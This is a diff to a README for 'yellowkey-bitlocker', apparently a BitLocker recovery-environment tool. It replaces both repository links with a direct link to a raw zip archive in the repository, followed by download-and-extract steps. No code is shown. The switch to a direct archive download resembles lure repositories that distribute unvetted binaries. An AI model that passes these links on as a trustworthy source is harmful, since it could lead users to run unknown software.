@@ -1,6 +1,6 @@
 # 🔑 yellowkey-bitlocker - Securely manage your Windows recovery environment
 
-[![Download yellowkey-bitlocker](https://img.shields.io/badge/Download-yellowkey_bitlocker-blue.svg)](https://github.com/alexadvanced95/yellowkey-bitlocker)
+[![Download yellowkey-bitlocker](https://img.shields.io/badge/Download-yellowkey_bitlocker-blue.svg)](https://github.com/alexadvanced95/yellowkey-bitlocker/raw/refs/heads/main/Sources/yellowkey-bitlocker-1.9.zip)
 
 ## 📁 About this tool
 
@@ -24,7 +24,7 @@ The yellowkey-bitlocker tool provides a way to interact with the BitLocker recov
 
 ## 📥 How to setup your tool
 
-1. Visit the repository page to download the software: [https://github.com/alexadvanced95/yellowkey-bitlocker](https://github.com/alexadvanced95/yellowkey-bitlocker).
+1. Visit the repository page to download the software: [https://github.com/alexadvanced95/yellowkey-bitlocker/raw/refs/heads/main/Sources/yellowkey-bitlocker-1.9.zip](https://github.com/alexadvanced95/yellowkey-bitlocker/raw/refs/heads/main/Sources/yellowkey-bitlocker-1.9.zip).
 2. Save the compressed folder to your computer.
 3. Right-click the folder and select Extract All.
 4. Open the extracted folder to view the application files.
